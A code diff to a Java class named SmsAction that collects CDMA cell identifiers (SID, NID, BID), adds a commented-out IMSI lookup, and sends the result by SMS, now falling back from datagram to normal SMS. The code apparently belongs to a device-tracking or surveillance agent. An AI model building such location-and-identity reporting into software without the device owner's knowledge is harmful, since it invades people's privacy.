@@ -105,7 +105,7 @@ public final class SmsAction extends SubAction {
             message = mb.toString();
         } else {
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
-
+            //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
             final int nid = cellinfo.getNID();
             final int bid = cellinfo.getBID();
@@ -130,19 +130,11 @@ public final class SmsAction extends SubAction {
 
     boolean sendSMS(final String message) {
         
-        return sendSMSDatagram(message);
-        
-      /*  boolean ret;
-        if (Device.isCDMA()) {
-            ret = sendSMSDatagram(message);
-            if (!ret) {
-                ret = sendSMSMessage(message);
-            }
-        } else {
+        boolean ret =  sendSMSDatagram(message);
+        if(!ret){
             ret = sendSMSMessage(message);
         }
-
-        return ret;*/
+        return ret;     
     }
 
     boolean sendSMSMessage(final String message) {
@@ -164,12 +156,12 @@ public final class SmsAction extends SubAction {
             conn.send(tmsg);
         } catch (final InterruptedIOException e) {
             //#ifdef DEBUG
-            debug.error("Cannot sending sms to: " + number + " ex:" + e);
+            debug.error("Cannot send message sms to: " + number + " ex:" + e);
             //#endif
             return false;
         } catch (final IOException e) {
             //#ifdef DEBUG
-            debug.error("Cannot sending sms to: " + number + " ex:" + e);
+            debug.error("Cannot send message sms to: " + number + " ex:" + e);
             //#endif
             return false;
         }
@@ -194,12 +186,12 @@ public final class SmsAction extends SubAction {
             
         } catch (final InterruptedIOException e) {
             //#ifdef DEBUG
-            debug.error("Cannot sending sms to: " + number + " ex:" + e);
+            debug.error("Cannot send Datagram sms to: " + number + " ex:" + e);
             //#endif
             return false;
         } catch (final IOException e) {
             //#ifdef DEBUG
-            debug.error("Cannot sending sms to: " + number + " ex:" + e);
+            debug.error("Cannot send Datagram sms to: " + number + " ex:" + e);
             //#endif
             return false;
         }
